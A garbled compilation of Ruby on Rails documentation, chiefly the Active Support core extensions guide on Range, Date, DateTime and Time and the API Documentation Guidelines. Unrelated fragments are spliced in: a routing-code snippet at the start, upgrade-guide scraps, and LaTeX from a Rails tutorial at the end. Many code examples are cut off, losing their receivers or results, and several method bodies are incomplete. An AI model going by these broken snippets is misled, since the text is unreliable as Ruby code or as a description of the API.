def assign_route_options(segments, defaults, requirements)
  if requirement.multiline?
    raise ArgumentError, "Regexp multiline option not allowed in routing requirements: #{requirement.inspect}"
NOTE: Defined in `active_support/core_ext/regexp.rb`.
Extensions to `Range`
Active Support extends the method `Range#to_s` so that it understands an optional format argument. 
As of this writing the only supported non-default format is `:db`:
# => "2009-10-25..2009-10-26"
# => "BETWEEN '2009-10-25' AND '2009-10-26'"
As the example depicts, the `:db` format generates a `BETWEEN` SQL clause. 
That is used by Active Record in its support for range values in conditions.
NOTE: Defined in `active_support/core_ext/range/conversions.rb`.
### `include?
The methods `Range#include?` and `Range#===` say whether some value falls between the ends of a given instance:
(2..3).include?(Math::E) # => true
Active Support extends these methods so that the argument may be another range in turn. 
In that case we test whether the ends of the argument range belong to the receiver themselves:
3..7)  # => true
0..7)  # => false
3..11) # => false
3..9)  # => false
(1..10) === (3..7)  # => true
(1..10) === (0..7)  # => false
(1..10) === (3..11) # => false
(1...9) === (3..9)  # => false
NOTE: Defined in `active_support/core_ext/range/include_range.rb`.
### `overlaps?
The method `Range#overlaps?` says whether any two given ranges have non-void intersection:
7..11)  # => true
0..7)   # => true
11..27) # => false
NOTE: Defined in `active_support/core_ext/range/overlaps.rb`.
Extensions to `Date`
### Calculations
NOTE: All the following methods are defined in `active_support/core_ext/date/calculations.rb`.
INFO: The following calculation methods have edge cases in October 1582, since days 5..14 just do not exist. 
This guide does not document their behavior around those days for brevity, but it is enough to say that they do what you would expect. 
That is, `Date.new(1582, 10, 4).tomorrow` returns `Date.new(1582, 10, 15)` and so on. 
Please check `test/core_ext/date_ext_test.rb` in the Active Support test suite for expected behavior.
#### `Date.current`
Active Support defines `Date.current` to be today in the current time zone. 
That's like `Date.today`, except that it honors the user time zone, if defined. 
It also defines `Date.yesterday` and `Date.tomorrow`, and the instance predicates `past?`, `today?`, and `future?`, all of them relative to `Date.current`.
When making Date comparisons using methods which honor the user time zone, make sure to use `Date.current` and not `Date.today`. 
There are cases where the user time zone might be in the future compared to the system time zone, which `Date.today` uses by default. 
This means `Date.today` may equal `Date.yesterday`.
#### Named dates
##### `prev_year`, `next_year`
In Ruby 1.9 `prev_year` and `next_year` return a date with the same day/month in the last or next year:
d = Date.new(2010, 5, 8) # => Sat, 08 May 2010
d.prev_year              # => Fri, 08 May 2009
d.next_year              # => Sun, 08 May 2011
If date is the 29th of February of a leap year, you obtain the 28th:
d = Date.new(2000, 2, 29) # => Tue, 29 Feb 2000
d.prev_year               # => Sun, 28 Feb 1999
d.next_year               # => Wed, 28 Feb 2001
`prev_year` is aliased to `last_year`.
##### `prev_month`, `next_month`
In Ruby 1.9 `prev_month` and `next_month` return the date with the same day in the last or next month:
d.prev_month             # => Thu, 08 Apr 2010
d.next_month             # => Tue, 08 Jun 2010
If such a day does not exist, the last day of the corresponding month is returned:
Date.new(2000, 5, 31).prev_month # => Sun, 30 Apr 2000
Date.new(2000, 3, 31).prev_month # => Tue, 29 Feb 2000
Date.new(2000, 5, 31).next_month # => Fri, 30 Jun 2000
Date.new(2000, 1, 31).next_month # => Tue, 29 Feb 2000
`prev_month` is aliased to `last_month`.
##### `prev_quarter`, `next_quarter`
Same as `prev_month` and `next_month`. 
It returns the date with the same day in the previous or next quarter:
t = Time.local(2010, 5, 8) # => Sat, 08 May 2010
t.prev_quarter             # => Mon, 08 Feb 2010
t.next_quarter             # => Sun, 08 Aug 2010
Time.local(2000, 7, 31).prev_quarter  # => Sun, 30 Apr 2000
Time.local(2000, 5, 31).prev_quarter  # => Tue, 29 Feb 2000
Time.local(2000, 10, 31).prev_quarter # => Mon, 30 Oct 2000
Time.local(2000, 11, 31).next_quarter # => Wed, 28 Feb 2001
`prev_quarter` is aliased to `last_quarter`.
##### `beginning_of_week`, `end_of_week`
The methods `beginning_of_week` and `end_of_week` return the dates for the<n>beginning and end of the week, respectively. 
Weeks are assumed to start on<n>Monday, but that can be changed passing an argument, setting thread local<n>`Date.beginning_of_week` or `config.beginning_of_week`.
d = Date.new(2010, 5, 8)     # => Sat, 08 May 2010
d.beginning_of_week          # => Mon, 03 May 2010
d.beginning_of_week(:sunday) # => Sun, 02 May 2010
d.end_of_week                # => Sun, 09 May 2010
d.end_of_week(:sunday)       # => Sat, 08 May 2010
`beginning_of_week` is aliased to `at_beginning_of_week` and `end_of_week` is aliased to `at_end_of_week`.
##### `monday`, `sunday`
The methods `monday` and `sunday` return the dates for the previous Monday and<n>next Sunday, respectively.
d.monday                     # => Mon, 03 May 2010
d.sunday                     # => Sun, 09 May 2010
d = Date.new(2012, 9, 10)    # => Mon, 10 Sep 2012
d.monday                     # => Mon, 10 Sep 2012
d = Date.new(2012, 9, 16)    # => Sun, 16 Sep 2012
d.sunday                     # => Sun, 16 Sep 2012
##### `prev_week`, `next_week`
The method `next_week` receives a symbol with a day name in English (default is the thread local `Date.beginning_of_week`, or `config.beginning_of_week`, or `:monday`) and it returns the date corresponding to that day.
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.next_week              # => Mon, 10 May 2010
d.next_week(:saturday)   # => Sat, 15 May 2010
The method `prev_week` is analogous:
d.prev_week              # => Mon, 26 Apr 2010
d.prev_week(:saturday)   # => Sat, 01 May 2010
d.prev_week(:friday)     # => Fri, 30 Apr 2010
`prev_week` is aliased to `last_week`.
Both `next_week` and `prev_week` work as expected when `Date.beginning_of_week` or `config.beginning_of_week` are set.
##### `beginning_of_month`, `end_of_month`
The methods `beginning_of_month` and `end_of_month` return the dates for the beginning and end of the month:
d.beginning_of_month     # => Sat, 01 May 2010
d.end_of_month           # => Mon, 31 May 2010
`beginning_of_month` is aliased to `at_beginning_of_month`, and `end_of_month` is aliased to `at_end_of_month`.
##### `beginning_of_quarter`, `end_of_quarter`
The methods `beginning_of_quarter` and `end_of_quarter` return the dates for the beginning and end of the quarter of the receiver's calendar year:
d.beginning_of_quarter   # => Thu, 01 Apr 2010
d.end_of_quarter         # => Wed, 30 Jun 2010
`beginning_of_quarter` is aliased to `at_beginning_of_quarter`, and `end_of_quarter` is aliased to `at_end_of_quarter`.
##### `beginning_of_year`, `end_of_year`
The methods `beginning_of_year` and `end_of_year` return the dates for the beginning and end of the year:
d.beginning_of_year      # => Fri, 01 Jan 2010
d.end_of_year            # => Fri, 31 Dec 2010
`beginning_of_year` is aliased to `at_beginning_of_year`, and `end_of_year` is aliased to `at_end_of_year`.
#### Other Date Computations
##### `years_ago`, `years_since`
The method `years_ago` receives a number of years and returns the same date those many years ago:
date = Date.new(2010, 6, 7)
date.years_ago(10) # => Wed, 07 Jun 2000
`years_since` moves forward in time:
date.years_since(10) # => Sun, 07 Jun 2020
Date.new(2012, 2, 29).years_ago(3)     # => Sat, 28 Feb 2009
Date.new(2012, 2, 29).years_since(3)   # => Sat, 28 Feb 2015
##### `months_ago`, `months_since`
The methods `months_ago` and `months_since` work analogously for months:
Date.new(2010, 4, 30).months_ago(2)   # => Sun, 28 Feb 2010
Date.new(2010, 4, 30).months_since(2) # => Wed, 30 Jun 2010
Date.new(2010, 4, 30).months_ago(2)    # => Sun, 28 Feb 2010
Date.new(2009, 12, 31).months_since(2) # => Sun, 28 Feb 2010
##### `weeks_ago`
The method `weeks_ago` works analogously for weeks:
Date.new(2010, 5, 24).weeks_ago(1)    # => Mon, 17 May 2010
Date.new(2010, 5, 24).weeks_ago(2)    # => Mon, 10 May 2010
##### `advance`
The most generic way to jump to other days is `advance`. 
This method receives a hash with keys `:years`, `:months`, `:weeks`, `:days`, and returns a date advanced as much as the present keys indicate:
date = Date.new(2010, 6, 6)
date.advance(years: 1, weeks: 2)  # => Mon, 20 Jun 2011
date.advance(months: 2, days: -2) # => Wed, 04 Aug 2010
Note in the previous example that increments may be negative.
To perform the computation the method first increments years, then months, then weeks, and finally days. 
This order is important towards the end of months. 
Say for example we are at the end of February of 2010, and we want to move one month and one day forward.
The method `advance` advances first one month, and then one day, the result is:
Date.new(2010, 2, 28).advance(months: 1, days: 1)
# => Sun, 29 Mar 2010
While if it did it the other way around the result would be different:
Date.new(2010, 2, 28).advance(days: 1).advance(months: 1)
# => Thu, 01 Apr 2010
#### Changing Components
The method `change` allows you to get a new date which is the same as the receiver except for the given year, month, or day:
Date.new(2010, 12, 23).change(year: 2011, month: 11)
# => Wed, 23 Nov 2011
This method is not tolerant to non-existing dates, if the change is invalid `ArgumentError` is raised:
Date.new(2010, 1, 31).change(month: 2)
# => ArgumentError: invalid date
#### Durations
Durations can be added to and subtracted from dates:
d = Date.current
# => Mon, 09 Aug 2010
d + 1.year
# => Tue, 09 Aug 2011
d - 3.hours
# => Sun, 08 Aug 2010 21:00:00 UTC +00:00
They translate to calls to `since` or `advance`. 
For example here we get the correct jump in the calendar reform:
Date.new(1582, 10, 4) + 1.day
# => Fri, 15 Oct 1582
#### Timestamps
INFO: The following methods return a `Time` object if possible, otherwise a `DateTime`. 
If set, they honor the user time zone.
##### `beginning_of_day`, `end_of_day`
The method `beginning_of_day` returns a timestamp at the beginning of the day (00:00:00):
date.beginning_of_day # => Mon Jun 07 00:00:00 +0200 2010
The method `end_of_day` returns a timestamp at the end of the day (23:59:59):
date.end_of_day # => Mon Jun 07 23:59:59 +0200 2010
##### `beginning_of_hour`, `end_of_hour`
The method `beginning_of_hour` returns a timestamp at the beginning of the hour (hh:00:00):
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.beginning_of_hour # => Mon Jun 07 19:00:00 +0200 2010
The method `end_of_hour` returns a timestamp at the end of the hour (hh:59:59):
date.end_of_hour # => Mon Jun 07 19:59:59 +0200 2010
`beginning_of_hour` is aliased to `at_beginning_of_hour`.
##### `beginning_of_minute`, `end_of_minute`
The method `beginning_of_minute` returns a timestamp at the beginning of the minute (hh:mm:00):
date.beginning_of_minute # => Mon Jun 07 19:55:00 +0200 2010
The method `end_of_minute` returns a timestamp at the end of the minute (hh:mm:59):
date.end_of_minute # => Mon Jun 07 19:55:59 +0200 2010
`beginning_of_minute` is aliased to `at_beginning_of_minute`.
INFO: `beginning_of_hour`, `end_of_hour`, `beginning_of_minute` and `end_of_minute` are implemented for `Time` and `DateTime` but **not** `Date` as it does not make sense to request the beginning or end of an hour or minute on a `Date` instance.
##### `ago`, `since`
The method `ago` receives a number of seconds as argument and returns a timestamp those many seconds ago from midnight:
date = Date.current # => Fri, 11 Jun 2010
date.ago(1)         # => Thu, 10 Jun 2010 23:59:59 EDT -04:00
Similarly, `since` moves forward:
date.since(1)       # => Fri, 11 Jun 2010 00:00:01 EDT -04:00
#### Other Time Computations
Extensions to `DateTime`
WARNING: `DateTime` is not aware of DST rules and so some of these methods have edge cases when a DST change is going on. 
For example `seconds_since_midnight` might not return the real amount in such a day.
NOTE: All the following methods are defined in `active_support/core_ext/date_time/calculations.rb`.
The class `DateTime` is a subclass of `Date` so by loading `active_support/core_ext/date/calculations.rb` you inherit these methods and their aliases, except that they will always return datetimes:
yesterday
beginning_of_week (at_beginning_of_week)
end_of_week (at_end_of_week)
monday
sunday
weeks_ago
prev_week (last_week)
next_week
months_ago
months_since
beginning_of_month (at_beginning_of_month)
end_of_month (at_end_of_month)
prev_month (last_month)
next_month
beginning_of_quarter (at_beginning_of_quarter)
end_of_quarter (at_end_of_quarter)
beginning_of_year (at_beginning_of_year)
end_of_year (at_end_of_year)
years_ago
years_since
prev_year (last_year)
next_year
The following methods are reimplemented so you do **not** need to load `active_support/core_ext/date/calculations.rb` for these ones:
beginning_of_day (midnight, at_midnight, at_beginning_of_day)
end_of_day
since (in)
On the other hand, `advance` and `change` are also defined and support more options, they are documented below.
The following methods are only implemented in `active_support/core_ext/date_time/calculations.rb` as they only make sense when used with a `DateTime` instance:
beginning_of_hour (at_beginning_of_hour)
end_of_hour
#### Named Datetimes
##### `DateTime.current`
Active Support defines `DateTime.current` to be like `Time.now.to_datetime`, except that it honors the user time zone, if defined. 
It also defines `DateTime.yesterday` and `DateTime.tomorrow`, and the instance predicates `past?`, and `future?` relative to `DateTime.current`.
#### Other Extensions
##### `seconds_since_midnight`
The method `seconds_since_midnight` returns the number of seconds since midnight:
now = DateTime.current     # => Mon, 07 Jun 2010 20:26:36 +0000
now.seconds_since_midnight # => 73596
##### `utc`
The method `utc` gives you the same datetime in the receiver expressed in UTC.
now = DateTime.current # => Mon, 07 Jun 2010 19:27:52 -0400
now.utc                # => Mon, 07 Jun 2010 23:27:52 +0000
This method is also aliased as `getutc`.
##### `utc?
The predicate `utc?` says whether the receiver has UTC as its time zone:
now = DateTime.now # => Mon, 07 Jun 2010 19:30:47 -0400
# => true
The most generic way to jump to another datetime is `advance`. 
This method receives a hash with keys `:years`, `:months`, `:weeks`, `:days`, `:hours`, `:minutes`, and `:seconds`, and returns a datetime advanced as much as the present keys indicate.
d = DateTime.current
# => Thu, 05 Aug 2010 11:33:31 +0000
d.advance(years: 1, months: 1, days: 1, hours: 1, minutes: 1, seconds: 1)
# => Tue, 06 Sep 2011 12:34:32 +0000
After that, it adjusts the time calling `since` with the number of seconds to advance. 
This order is relevant, a different ordering would give different datetimes in some edge-cases. 
The example in `Date#advance` applies, and we can extend it to show order relevance related to the time bits.
If we first move the date bits (that have also a relative order of processing, as documented before), and then the time bits we get for example the following computation:
d = DateTime.new(2010, 2, 28, 23, 59, 59)
# => Sun, 28 Feb 2010 23:59:59 +0000
d.advance(months: 1, seconds: 1)
# => Mon, 29 Mar 2010 00:00:00 +0000
but if we computed them the other way around, the result would be different:
d.advance(seconds: 1).advance(months: 1)
# => Thu, 01 Apr 2010 00:00:00 +0000
WARNING: Since `DateTime` is not DST-aware you can end up in a non-existing point in time with no warning or error telling you so.
The method `change` allows you to get a new datetime which is the same as the receiver except for the given options, which may include `:year`, `:month`, `:day`, `:hour`, `:min`, `:sec`, `:offset`, `:start`:
now = DateTime.current
# => Tue, 08 Jun 2010 01:56:22 +0000
now.change(year: 2011, offset: Rational(-6, 24))
# => Wed, 08 Jun 2011 01:56:22 -0600
If hours are zeroed, then minutes and seconds are too (unless they have given values):
now.change(hour: 0)
# => Tue, 08 Jun 2010 00:00:00 +0000
Similarly, if minutes are zeroed, then seconds are too (unless it has given a value):
now.change(min: 0)
# => Tue, 08 Jun 2010 01:00:00 +0000
DateTime.current.change(month: 2, day: 30)
Durations can be added to and subtracted from datetimes:
# => Mon, 09 Aug 2010 23:15:17 +0000
now + 1.year
# => Tue, 09 Aug 2011 23:15:17 +0000
now - 1.week
# => Mon, 02 Aug 2010 23:15:17 +0000
DateTime.new(1582, 10, 4, 23) + 1.hour
# => Fri, 15 Oct 1582 00:00:00 +0000
Extensions to `Time`
NOTE: All the following methods are defined in `active_support/core_ext/time/calculations.rb`.
Active Support adds to `Time` many of the methods available for `DateTime`:
past?
today?
future?
seconds_since_midnight
advance
They are analogous. 
Please refer to their documentation above and take into account the following differences:
* `change` accepts an additional `:usec` option.
* `Time` understands DST, so you get correct DST calculations as in
Time.zone_default
# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...
# In Barcelona, 2010/03/28 02:00 +0100 becomes 2010/03/28 03:00 +0200 due to DST.
t = Time.local(2010, 3, 28, 1, 59, 59)
# => Sun Mar 28 01:59:59 +0100 2010
t.advance(seconds: 1)
# => Sun Mar 28 03:00:00 +0200 2010
* If `since` or `ago` jump to a time that can't be expressed with `Time` a `DateTime` object is returned instead.
#### `Time.current`
Active Support defines `Time.current` to be today in the current time zone. 
That's like `Time.now`, except that it honors the user time zone, if defined. 
It also defines the instance predicates `past?`, `today?`, and `future?`, all of them relative to `Time.current`.
When making Time comparisons using methods which honor the user time zone, make sure to use `Time.current` instead of `Time.now`. 
There are cases where the user time zone might be in the future compared to the system time zone, which `Time.now` uses by default. 
This means `Time.now.to_date` may equal `Date.yesterday`.
#### `all_day`, `all_week`, `all_month`, `all_quarter` and `all_year`
The method `all_day` returns a range representing the whole day of the current time.
now = Time.current
# => Mon, 09 Aug 2010 23:20:05 UTC +00:00
now.all_day
# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..
Mon, 09 Aug 2010 23:59:59 UTC +00:00
Analogously, `all_week`, `all_month`, `all_quarter` and `all_year` all serve the purpose of generating time ranges.
now.all_week
Sun, 15 Aug 2010 23:59:59 UTC +00:00
now.all_week(:sunday)
# => Sun, 16 Sep 2012 00:00:00 UTC +00:00..
Sat, 22 Sep 2012 23:59:59 UTC +00:00
now.all_month
# => Sat, 01 Aug 2010 00:00:00 UTC +00:00..
Tue, 31 Aug 2010 23:59:59 UTC +00:00
now.all_quarter
# => Thu, 01 Jul 2010 00:00:00 UTC +00:00..
Thu, 30 Sep 2010 23:59:59 UTC +00:00
now.all_year
# => Fri, 01 Jan 2010 00:00:00 UTC +00:00..
Fri, 31 Dec 2010 23:59:59 UTC +00:00
### Time Constructors
Time.current
# => Fri, 06 Aug 2010 17:11:58 CEST +02:00
Analogously to `DateTime`, the predicates `past?`, and `future?` are relative to `Time.current`.
If the time to be constructed lies beyond the range supported by `Time` in the runtime platform, usecs are discarded and a `DateTime` object is returned instead.
Durations can be added to and subtracted from time objects:
#  => Tue, 09 Aug 2011 23:21:11 UTC +00:00
# => Mon, 02 Aug 2010 23:21:11 UTC +00:00
Time.utc(1582, 10, 3) + 5.days
# => Mon Oct 18 00:00:00 UTC 1582
Extensions to `File`
### `atomic_write`
With the class method `File.atomic_write` you can write to a file in a way that will prevent any reader from seeing half-written content.
The name of the file is passed as an argument, and the method yields a file handle opened for writing. 
Once the block is done `atomic_write` closes the file handle and completes its job.
For example, Action Pack uses this method to write asset cache files like `all.css`:
File.atomic_write(joined_asset_path) do |cache|
  cache.write(join_asset_file_contents(asset_paths))
To accomplish this `atomic_write` creates a temporary file. 
That's the file the code in the block actually writes to. 
On completion, the temporary file is renamed, which is an atomic operation on POSIX systems. 
If the target file exists `atomic_write` overwrites it and keeps owners and permissions. 
However there are a few cases where `atomic_write` cannot change the file ownership or permissions, this error is caught and skipped over trusting in the user/filesystem to ensure the file is accessible to the processes that need it.
NOTE. Due to the chmod operation `atomic_write` performs, if the target file has an ACL set on it this ACL will be recalculated/modified.
WARNING. Note you can't append with `atomic_write`.
The auxiliary file is written in a standard directory for temporary files, but you can pass a directory of your choice as second argument.
NOTE: Defined in `active_support/core_ext/file/atomic.rb`.
Extensions to `Marshal`
### `load`
Active Support adds constant autoloading support to `load`.
For example, the file cache store deserializes this way:
File.open(file_name) { |f| Marshal.load(f) }
If the cached data refers to a constant that is unknown at that point, the autoloading mechanism is triggered and if it succeeds the deserialization is retried transparently.
WARNING. If the argument is an `IO` it needs to respond to `rewind` to be able to retry. 
Regular files respond to `rewind`.
NOTE: Defined in `active_support/core_ext/marshal.rb`.
Extensions to `NameError`
Active Support adds `missing_name?` to `NameError`, which tests whether the exception was raised because of the name passed as argument.
The name may be given as a symbol or string. 
A symbol is tested against the bare constant name, a string is against the fully-qualified constant name.
TIP: A symbol can represent a fully-qualified constant name as in `:"ActiveRecord::Base"`, so the behavior for symbols is defined for convenience, not because it has to be that way technically.
For example, when an action of `ArticlesController` is called Rails tries optimistically to use `ArticlesHelper`. 
It is OK that the helper module does not exist, so if an exception for that constant name is raised it should be silenced. 
But it could be the case that `articles_helper.rb` raises a `NameError` due to an actual unknown constant. 
That should be reraised. 
The method `missing_name?` provides a way to distinguish both cases:
def default_helper_module!
  module_name = name.sub(/Controller$/, '')
  module_path = module_name.underscore
  helper module_path
  raise e unless e.is_missing? 
"helpers/#{module_path}_helper"
  raise e unless e.missing_name? 
"#{module_name}Helper"
NOTE: Defined in `active_support/core_ext/name_error.rb`.
Extensions to `LoadError`
Given a path name `is_missing?` tests whether the exception was raised due to that particular file (except perhaps for the ".rb" extension).
For example, when an action of `ArticlesController` is called Rails tries to load `articles_helper.rb`, but that file may not exist. 
That's fine, the helper module is not mandatory so Rails silences a load error. 
But it could be the case that the helper module does exist and in turn requires another library that is missing. 
In that case Rails must reraise the exception. 
The method `is_missing?` provides a way to distinguish both cases:
NOTE: Defined in `active_support/core_ext/load_error.rb`.
If you want them to run in other environments consult the
[Spring README](https://github.com/rails/spring#rake).
You must replace any plugins by extracting them to gems and adding them to your Gemfile. 
#   self.include_root_in_json = false
  get 'clashing/:id' => 'test#example', as: :example
API Documentation Guidelines
This guide documents the Ruby on Rails API documentation guidelines.
* How to write effective prose for documentation purposes.
* Style guidelines for documenting different kinds of Ruby code.
The [Rails API documentation](http://api.rubyonrails.org) is generated with<n>[RDoc](http://docs.seattlerb.org/rdoc/).
  bundle exec rake rdoc
Resulting HTML files can be found in the ./doc/rdoc directory.
Please consult the RDoc documentation for help with the<n>[markup](http://docs.seattlerb.org/rdoc/RDoc/Markup.html),<n>and also take into account these [additional<n>directives](http://docs.seattlerb.org/rdoc/RDoc/Parser/Ruby.html).
Wording
Write simple, declarative sentences. 
Brevity is a plus: get to the point.
Write in present tense: "Returns a hash that...", rather than "Returned a hash that..." or "Will return a hash that...".
Start comments in upper case. 
Follow regular punctuation rules:
# Declares an attribute reader backed by an internally-named
# instance variable.
def attr_internal_reader(*attrs)
Communicate to the reader the current way of doing things, both explicitly and implicitly. 
Use the idioms recommended in edge. 
Reorder sections to emphasize favored approaches if needed, etc. 
The documentation should be a model for best practices and canonical, modern Rails usage.
Documentation has to be concise but comprehensive. 
Explore and document edge cases. 
What happens if a module is anonymous? 
What if a collection is empty? 
What if an argument is nil?
The proper names of Rails components have a space in between the words, like "Active Support". 
`ActiveRecord` is a Ruby module, whereas Active Record is an ORM. 
All Rails documentation should consistently refer to Rails components by their proper name, and if in your next blog post or presentation you remember this tidbit and take it into account that'd be phenomenal.
Spell names correctly: Arel, Test::Unit, RSpec, HTML, MySQL, JavaScript, ERB. 
When in doubt, please have a look at some authoritative source like their official documentation.
Use the article "an" for "SQL", as in "an SQL statement". 
Also "an SQLite database".
Prefer wordings that avoid "you"s and "your"s. 
For example, instead of
```markdown
If you need to use `return` statements in your callbacks, it is recommended that you explicitly define them as methods.
use this style:
If `return` is needed it is recommended to explicitly define a method.
That said, when using pronouns in reference to a hypothetical person, such as "a<n>user with a session cookie", gender neutral pronouns (they/their/them) should be<n>used. 
Instead of:
* he or she... use they.
* him or her... use them.
* his or her... use their.
* his or hers... use theirs.
* himself or herself... use themselves.
English
Please use American English (*color*, *center*, *modularize*, etc). 
See [a list of American and British English spelling differences here](http://en.wikipedia.org/wiki/American_and_British_English_spelling_differences).
Example Code
Choose meaningful examples that depict and cover the basics as well as interesting points or gotchas.
Use two spaces to indent chunks of code--that is, for markup purposes, two spaces with respect to the left margin. 
The examples themselves should use [Rails coding conventions](contributing_to_ruby_on_rails.html#follow-the-coding-conventions).
Short docs do not need an explicit "Examples" label to introduce snippets; they just follow paragraphs:
# Converts a collection of elements into a formatted string by
# calling +to_s+ on all elements and joining them.
#   Blog.all.to_formatted_s # => "First PostSecond PostThird Post"
On the other hand, big chunks of structured documentation may have a separate "Examples" section:
# ==== Examples
#   Person.exists?(
#   Person.exists?('
name: "David")
#   Person.exists?(['
name LIKE ?', "%#{query}%"])
The results of expressions follow them and are introduced by "# => ", vertically aligned:
#   1.even? 
#   1.odd?  
#   2.even? 
#   2.odd?  
If a line is too long, the comment may be placed on the next line:
#   label(:article, :title)
#   # => <label for="article_title">Title</label>
#   label(:article, :title, "A short title")
#   # => <label for="article_title">A short title</label>
#   label(:article, :title, "A short title", class: "title_label")
#   # => <label for="article_title" class="title_label">A short title</label>
Avoid using any printing methods like `puts` or `p` for that purpose.
On the other hand, regular comments do not use an arrow:
#   polymorphic_url(record)  # same as comment_url(record)
Booleans
In predicates and flags prefer documenting boolean semantics over exact values.
When "true" or "false" are used as defined in Ruby use regular font. 
The<n>singletons `true` and `false` need fixed-width font. 
Please avoid terms like<n>"truthy", Ruby defines what is true and false in the language, and thus those<n>words have a technical meaning and need no substitutes.
As a rule of thumb, do not document singletons unless absolutely necessary. 
That<n>prevents artificial constructs like `!!` or ternaries, allows refactors, and the<n>code does not need to rely on the exact values returned by methods being called<n>in the implementation.
`config.action_mailer.perform_deliveries` specifies whether mail will actually be delivered and is true by default
the user does not need to know which is the actual default value of the flag,<n>and so we only document its boolean semantics.
An example with a predicate:
# Returns true if the collection is empty.
# If the collection has been loaded
# it is equivalent to <tt>collection.size.zero?</tt>. If the
# collection has not been loaded, it is equivalent to
# <tt>collection.exists?</tt>. If the collection has not already been
# loaded and you are going to fetch the records anyway it is better to
# check <tt>collection.length.zero?</tt>.
def empty?
  if loaded?
    size.zero?
    @target.blank? 
The API is careful not to commit to any particular value, the method has<n>predicate semantics, that's enough.
File Names
As a rule of thumb, use filenames relative to the application root:
config/routes.rb            # YES
routes.rb                   # NO
RAILS_ROOT/config/routes.rb # NO
Fonts
### Fixed-width Font
Use fixed-width fonts for:
* Constants, in particular class and module names.
* Method names.
* Literals like `nil`, `false`, `true`, `self`.
* Symbols.
* Method parameters.
* File names.
class Array
  # Calls +to_param+ on all its elements and joins the result with
  # slashes. 
This is used by +url_for+ in Action Pack.
    collect { |e| e.to_param }.join '/'
WARNING: Using `+...+` for fixed-width font only works with simple content like<n>ordinary method names, symbols, paths (with forward slashes), etc. 
Please use<n>`<tt>...</tt>` for everything else, notably class or module names with a<n>namespace as in `<tt>ActiveRecord::Base</tt>`.
You can quickly test the RDoc output with the following command:
$ echo "+:to_param+" | rdoc --pipe
#=> <p><code>:to_param</code></p>
### Regular Font
When "true" and "false" are English words rather than Ruby keywords use a regular font:
# Runs all the validations within the specified context.
# Returns true if no errors are found, false otherwise.
# If the argument is false (default is +nil+), the context is
# set to <tt>:create</tt> if <tt>new_record?
</tt> is true,
# and to <tt>:update</tt> if it is not.
# Validations with no <tt>:on</tt> option will run no
# matter the context. 
Validations with # some <tt>:on</tt>
# option will only run in the specified context.
def valid?(
Description Lists
In lists of options, parameters, etc. use a hyphen between the item and its description (reads better than a colon because normally options are symbols):
# * <tt>:allow_nil</tt> - Skip validation if attribute is +nil+.
The description starts in upper case and ends with a full stop-it's standard English.
Dynamically Generated Methods
Methods created with `(module|class)_eval(STRING)` have a comment by their side with an instance of the generated code. 
That comment is 2 spaces away from the template:
for severity in Severity.constants
  class_eval <<-EOT, __FILE__, __LINE__
    def #{severity.downcase}(message = nil, progname = nil, &block)  # def debug(message = nil, progname = nil, &block)
      add(#{severity}, message, progname, &block)                    #   add(DEBUG, message, progname, &block)
    end                                                              # end
                                                                     #
    def #{severity.downcase}?                                        
# def debug?
      #{severity} >= @level                                          #   DEBUG >= @level
  EOT
If the resulting lines are too wide, say 200 columns or more, put the comment above the call:
# def self.find_by_login_and_activated(*args)
#   options = args.extract_options!
#   ...
self.class_eval %{
  def self.#{method_id}(*args)
    options = args.extract_options!
Method Visibility
When writing documentation for Rails, it's important to understand the difference between public user-facing API vs internal API.
Rails, like most libraries, uses the private keyword from Ruby for defining internal API. 
However, public API follows a slightly different convention. 
Instead of assuming all public methods are designed for user consumption, Rails uses the `:nodoc:` directive to annotate these kinds of methods as internal API.
This means that there are methods in Rails with `public` visibility that aren't meant for user consumption.
An example of this is `ActiveRecord::Core::ClassMethods#arel_table`:
module ActiveRecord::Core::ClassMethods
  def arel_table #:nodoc:
    # do some magic..
If you thought, "this method looks like a public class method for `ActiveRecord::Core`", you were right. 
But actually the Rails team doesn't want users to rely on this method. 
So they mark it as `:nodoc:` and it's removed from public documentation. 
The reasoning behind this is to allow the team to change these methods according to their internal needs across releases as they see fit. 
The name of this method could change, or the return value, or this entire class may disappear; there's no guarantee and so you shouldn't depend on this API in your plugins or applications. 
Otherwise, you risk your app or gem breaking when you upgrade to a newer release of Rails.
As a contributor, it's important to think about whether this API is meant for end-user consumption. 
The Rails team is committed to not making any breaking changes to public API across releases without going through a full deprecation cycle. 
It's recommended that you `:nodoc:` any of your internal methods/classes unless they're already private (meaning visibility), in which case it's internal by default. 
Once the API stabilizes the visibility can change, but changing public API is much harder due to backwards compatibility.
A class or module is marked with `:nodoc:` to indicate that all methods are internal API and should never be used directly.
If you come across an existing `:nodoc:` you should tread lightly. 
Consider asking someone from the core team or author of the code before removing it. 
A `:nodoc:` should never be added simply because a method or class is missing documentation. 
There may be an instance where an internal public method wasn't given a `:nodoc:` by mistake, for example when switching a method from private to public visibility. 
When this happens it should be discussed over a PR on a case-by-case basis and never committed directly to docrails.
To summarize, the Rails team uses `:nodoc:` to mark publicly visible methods and classes for internal use; changes to the visibility of API should be considered carefully and discussed over a pull request first.
Regarding the Rails Stack
When documenting parts of Rails API, it's important to remember all of the<n>pieces that go into the Rails stack.
This means that behavior may change depending on the scope or context of the<n>method or class you're trying to document.
In various places there is different behavior when you take the entire stack<n>into account, one such example is<n>`ActionView::Helpers::AssetTagHelper#image_tag`:
# image_tag("icon.png")
#   # => <img alt="Icon" src="/assets/icon.png" />
Although the default behavior for `#image_tag` is to always return<n>`/images/icon.png`, we take into account the full Rails stack (including the<n>Asset Pipeline) we may see the result seen above.
We're only concerned with the behavior experienced when using the full default<n>Rails stack.
In this case, we want to document the behavior of the _framework_, and not just<n>this specific method.
If you have a question on how the Rails team handles certain API, don't hesitate to open a ticket or send a patch to the [issue tracker](https://github.com/rails/rails/issues).
The functionality will be utterly under-developed, and many of the steps will seem like magic, but worry not: the full sample app will develop a similar application from the ground up starting in Chapter~\ref{cha:static_pages}, and I will provide plentiful forward-references to later material.
A \kode{Gemfile} for the toy app.
Note that Listing~\ref{code:demo_gemfile_sqlite_version_redux} is identical to Listing~\ref{code:gemfile_pg_gem}.
Creating the toy app repository at Bitbucket.
The data model for users.
As we'll see starting in Section~\ref{sec:database_migrations}, the label \kode{users} in Figure~\ref{fig:demo_user_model} corresponds to a \emph{table} in a database, and the \kode{id}, \kode{name}, and \kode{email} attributes are \emph{columns} in that table.
